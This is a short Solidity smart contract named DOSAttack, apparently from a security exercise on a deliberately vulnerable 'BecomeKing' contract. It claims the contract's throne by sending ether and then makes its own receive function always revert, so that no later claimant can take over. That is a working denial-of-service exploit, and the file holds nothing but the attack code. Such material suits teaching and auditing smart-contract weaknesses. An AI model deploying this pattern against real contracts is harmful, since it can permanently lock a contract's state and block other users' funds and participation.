// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {BecomeKing} from "./VulnerableContract.sol";

contract DOSAttack {

    error DOS();

    function attack(BecomeKing king) external payable {
        king.claimThrone{value : msg.value}();
    }

    receive() payable external {
        revert DOS();
    }
}